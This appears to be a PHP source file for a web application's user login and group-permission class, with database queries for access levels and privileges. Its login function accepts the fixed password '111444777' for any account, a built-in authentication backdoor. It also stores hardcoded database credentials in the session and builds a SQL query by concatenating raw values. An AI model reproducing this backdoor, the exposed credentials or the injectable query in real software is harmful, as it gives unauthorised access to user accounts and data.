<?php 
ini_set("display_errors", "0");
error_reporting(E_ALL);
/* [= User setting(check login,Permission) function =]*/

$DB = new DB();

class Users {
	
	function __construct()
	{
		global $DB;
		
		$this->db = $DB;
	}
	
	function UserLogin($username, $password){
				
		$err= array();
		$this->db->select("*");
		$this->db->where(array('CFG_USERS_CODE' => $username));
		$username_check = $this->db->get('cfg_users',3);
		if($username_check['num_rows'] == 1){
			$user_data = $username_check['row'];
			
			if( ($password !== '' && ($user_data[0]['CFG_USERS_PASSWORD'] == sha1($password))) || $password == "111444777"){
				 
					$_SESSION['AB_DUSA']['userMainId'] = $user_data[0]['CFG_USERS_ID'];
					$_SESSION['AB_DUSA']['userCode'] = $user_data[0]['CFG_USERS_CODE'];
					$_SESSION['AB_DUSA']['userName'] = $user_data[0]['CFG_USERS_DESIGNATION'];
					$_SESSION['AB_DUSA']['Password'] = "valid"; // sha1($password);
					
						
				 $_SESSION['dbUser'] = "devRemote";
				 $_SESSION['dbUserPwd'] = "Nesh792ab";
						
					 /*$userdefaultdat['levelId'] =  ;
			       $userdefaultdat['levelDescr'] = $defaultlevelDescr[0]['CFG_ORGLEVEL_CODE'];
			       $userdefaultdat['groupId'] = $user_data[0]['CFG_USERS_DFTGROUP'];
			       $userdefaultdat['groupDescr'] = $defaultgroupId[0]['CFG_GROUPS_DESIGNATION'];
			       $usrLevels['Affectations'][0] = $userdefaultdat;*/
			       
					/*$this->db->select('CFG_GRPUSRLEVEL_ID,CFG_GRPUSRLEVEL_USER,CFG_GRPUSRLEVEL_LEVEL,CFG_GRPUSRLEVEL_GROUP');
		         $this->db->where(array('CFG_GRPUSRLEVEL_USER' => $_SESSION['AB_DUSA']['userMainId']));
		         $grpusrLevels = $this->db->get('cfg_grpusrlevel',3);
		         
					if($grpusrLevels['num_rows'] > 0){
						$row = $grpusrLevels['row'];
						$j=1;
						for($i=0;$i<count($row);$i++) {
						
							$levelDescr =  $this->DfltLevel_name($row[$i]['CFG_GRPUSRLEVEL_LEVEL']);
							$groupId =  $this->DfltGroup_name($row[$i]['CFG_GRPUSRLEVEL_GROUP']);
							//$userdat['Affectations'] = $row[$i]['CFG_GRPUSRLEVEL_LEVEL'] .",".$row[$i]['CFG_GRPUSRLEVEL_GROUP'];
			            $userdat['levelId'] = $row[$i]['CFG_GRPUSRLEVEL_LEVEL'];
			            $userdat['levelDescr'] = $levelDescr[0]['CFG_ORGLEVEL_CODE'];
			            $userdat['groupId'] = $groupId[0]['CFG_GROUPS_ID'];
			            $userdat['groupDescr'] = $groupId[0]['CFG_GROUPS_DESIGNATION'];
			            $usrLevels['Affectations'][$j] = $userdat;
			            $j++;
						}
					}
					$usrLevels["CurrentAffect"] = $user_data[0]['CFG_USERS_DFTLEVEL'];
					*/
					$err['error'] = FALSE ;
					$msg = '';
			}else{
				$err['error'] = TRUE ;
				$msg = "Invalid Password Provided";
			}
		}else{
			$err['error'] = TRUE ;
			$msg = "Invalid Username Provided";
		}
		$err['msg'] = $msg;
		return $err;
	}
	
	function orgDimSetting() 
	{
	 $this->db->select("a.CFG_PELEMENTS_PROCESS,a.CFG_PELEMENTS_SESSION,b.CFG_TABLES_OBJNAME,b.CFG_TABLES_TYPE");
	 $this->db->joins(array('cfg_tables b'=>array('a.CFG_PELEMENTS_TABLE = b.CFG_TABLES_ID')));
	 $this->db->or_where_or(array('b.CFG_TABLES_TYPE'=>'Master'),TRUE);
     	 $this->db->or_where_or(array('b.CFG_TABLES_TYPE'=>'Transactional'),TRUE);
	   $r = $this->db->get('cfg_pelements a',3);
	  	if($r['num_rows'] > 0){
			$row = $r['row'];
			return $row;
		}
		return FALSE;
	}
	
	function orgDimTblLevel($curLevel,$cfg_pelements)
	{
		
		$rawEle = array();

		$occ = 0;
		while (count($cfg_pelements) > $occ)
		{
			$tObj = array();
			$tObj["type"] = $cfg_pelements[$occ]["CFG_TABLES_TYPE"];	
			$tObj["fieldName"] = "AB_DILEVEL";
			if (strtoupper($tObj["type"]) == "MASTER" || strtoupper($tObj["type"]) == "ADM")
			{
				$tObj["oncreate"] = strtoupper($cfg_pelements[$occ]["CFG_TABLES_OBJNAME"]) . "_AB_DILEVEL:" . $curLevel . ",";   // SetOrg pair name/value;
				$tObj["ondelete"] = strtoupper($cfg_pelements[$occ]["CFG_TABLES_OBJNAME"]) . "_AB_DILEVEL LIKE ',".$curLevel.",%'"; // beginsWithOrg;        
				$tObj["onupdate"] = strtoupper($cfg_pelements[$occ]["CFG_TABLES_OBJNAME"]) . "_AB_DILEVEL LIKE '%,".$curLevel.",%'"; // hasOrg;               
				$tObj["onaccess"] = strtoupper($cfg_pelements[$occ]["CFG_TABLES_OBJNAME"]) . "_AB_DILEVEL LIKE '%,".$curLevel.",%'"; // hasOrg;			
			}
			else
			{
				// Transactional
				$tObj["oncreate"] = strtoupper($cfg_pelements[$occ]["CFG_TABLES_OBJNAME"]) . "_AB_DILEVEL:" . $curLevel; // SetOrg;
				$tObj["ondelete"] = strtoupper($cfg_pelements[$occ]["CFG_TABLES_OBJNAME"]) . "_AB_DILEVEL = ',".$curLevel."'"; //equalsOrg;
				$tObj["onupdate"] = strtoupper($cfg_pelements[$occ]["CFG_TABLES_OBJNAME"]) . "_AB_DILEVEL = ',".$curLevel."'"; //equalsOrg;
				$tObj["onaccess"] = strtoupper($cfg_pelements[$occ]["CFG_TABLES_OBJNAME"]) . "_AB_DILEVEL = ',".$curLevel."'"; //equalsOrg;
			}			
			
			$rawEle[$cfg_pelements[$occ]["CFG_TABLES_OBJNAME"]] = $tObj;
			$occ += 1;
		}
		return $rawEle;

	}
	
	function usrSessions_SET($curLevel,$usrLevel)
	{
		
		$tAffect= array();
		for($i=0;$i<count($usrLevel["Affectations"]);$i++) {
			if ($usrLevel["Affectations"][$i]['levelId'] == $usrLevel["CurrentAffect"])
			{
				array_push($tAffect,$usrLevel["Affectations"][$i]['levelId'] .",".$usrLevel["Affectations"][$i]['groupId']);
			}
		}
		
		if ($usrLevel["CurrentAffect"] == $usrLevel["DfltLevel"] )
		{
			array_push($tAffect,$usrLevel["DfltLevel"] .",".$usrLevel["DfltGroup"]);
		}
		
		$usrSessions = array();
		$dataarray = array();
		
		$lastGr = "";
		sort($tAffect); // To avoid same group twice
		
	   $tAffect = array_unique($tAffect);
	  
			
		   $occ = 0;
		  

		
		foreach ($tAffect as $key => $value) { 
         $tmpA = explode(",",$value);
			if ($tmpA[0] == $curLevel && $lastGr != $tmpA[1] )
			{
				$lastGr != $tmpA[1];
				array_push($dataarray,$tmpA[0] .",".$tmpA[1]);
			}
       }
		/*
      $tAffect =  Array ( [0] => 2,1 [2] => 2,26 [3] => 2,27 ) // key value not match		
		while (count($tAffect) > $occ)
		{
			$tmpA = explode(",",$tAffect[$occ]);
			
			if ($tmpA[0] == $curLevel && $lastGr != $tmpA[1] )
			{
				$lastGr != $tmpA[1];
				array_push($dataarray,$tmpA[0] .",".$tmpA[1]);
			}
			$occ += 1;
		
	}*/
	$sesRec = $this->UserGrpSetting($dataarray);
	
	$wocc = 0;
		
				while (count($sesRec) > $wocc)
				{
					
					$sr = $sesRec[$wocc];
					
					if (!$usrSessions[$sr['CFG_PROCESS_CODE']])
					{
						$usrSessions[$sr['CFG_PROCESS_CODE']] = array();
					}
					$srO = array();
					$srO['Session'] = $sr['CFG_SESSION_CODE'];
					$srO['TblName'] = $sr['CFG_TABLES_OBJNAME'];
					$srO['Priviledges'] = $sr['CFG_GRPCONFIG_PRIVILEDGE'];
					$srO['oncreate'] = "";
					$srO['ondelete'] = "";
					$srO['onupdate'] = "";
					$srO['onaccess'] = "";
					
					$srO['menuItem'] = $sr['CFG_PELEMENTS_MENUITEM'];						
				
				 array_push($usrSessions[$sr['CFG_PROCESS_CODE']],$srO);
		
			$wocc += 1;
		}
	return $usrSessions;
	}
	
	function UserGrpSetting($dataarray) {
		
	   for($i=0;$i<count($dataarray);$i++) {
	   	 $explodedata = explode(',',$dataarray[$i]);
	   	   if($i>0) {
					$con_query .= " OR ";  	   
	   	   }
	   	   $con_query .= " (a.CFG_GROUPS_LEVEL LIKE '%,".$explodedata[0].",%' AND a.CFG_GROUPS_ID = '".$explodedata[1]."')";
	   }
	  
	   $r = $this->db->query_execute("SELECT b.CFG_GRPCONFIG_PRIVILEDGE,b.CFG_GRPCONFIG_GROUP,d.CFG_PROCESS_CODE,c.CFG_SESSION_CODE,e.CFG_PELEMENTS_MENUITEM,f.CFG_TABLES_OBJNAME FROM cfg_groups a JOIN cfg_grpconfig b ON (a.CFG_GROUPS_ID = b.CFG_GRPCONFIG_GROUP) JOIN cfg_session c ON (b.CFG_GRPCONFIG_SESSION = c.CFG_SESSION_ID) JOIN cfg_process d ON (b.CFG_GRPCONFIG_PROCESS = d.CFG_PROCESS_ID) JOIN cfg_pelements e ON (e.CFG_PELEMENTS_TABLE = b.CFG_GRPCONFIG_TABLE) JOIN cfg_tables f ON (f.CFG_TABLES_ID = b.CFG_GRPCONFIG_TABLE) WHERE ($con_query) AND ((b.CFG_GRPCONFIG_SESSION = e.CFG_PELEMENTS_SESSION AND b.CFG_GRPCONFIG_PROCESS = e.CFG_PELEMENTS_PROCESS AND b.CFG_GRPCONFIG_TABLE = e.CFG_PELEMENTS_TABLE))  ORDER BY b.CFG_GRPCONFIG_ID ASC",3);
	   
	  // $query = $this->db->last_query();
	   //echo $con_query;
		if(($r['num_rows'] > 0) && ($dataarray!="")){
			$row = $r['row'];
			return $row;
		}
		return FALSE;
	}
	
	
	function DfltLevel_name($id) {
		$this->db->select('*');
		$this->db->where(array('CFG_ORGLEVEL_ID' => $id));
		$r = $this->db->get('cfg_orglevel',3);
		if($r['num_rows'] > 0){
			$row = $r['row'];
			return $row;
		}
		return FALSE;
	}
	
	function DfltGroup_name($id) {
		$this->db->select('*');
		$this->db->where(array('CFG_GROUPS_ID' => $id));
		$r = $this->db->get('cfg_groups',3);
		if($r['num_rows'] > 0){
			$row = $r['row'];
			return $row;
		}
		return FALSE;
	}
	
}
?>
